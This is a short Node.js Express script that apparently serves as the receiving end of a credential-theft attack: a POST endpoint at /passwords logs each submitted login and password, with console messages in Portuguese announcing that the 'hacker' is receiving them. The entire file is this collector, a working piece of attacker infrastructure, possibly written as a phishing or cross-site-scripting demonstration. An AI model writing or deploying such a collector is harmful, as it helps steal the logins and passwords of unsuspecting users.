var express = require('express')
var bodyParser = require('body-parser')

var app = express()

app.use(bodyParser.json())
app.use(bodyParser.urlencoded({extended: false}))

app.post('/passwords', (req, res) => {
    console.log('Hacker recebendo...');
    console.log(`User ${req.body.login} and password ${req.body.password}`)
})

app.listen(3001, () => {
    console.log('Racker app is listening...')
})
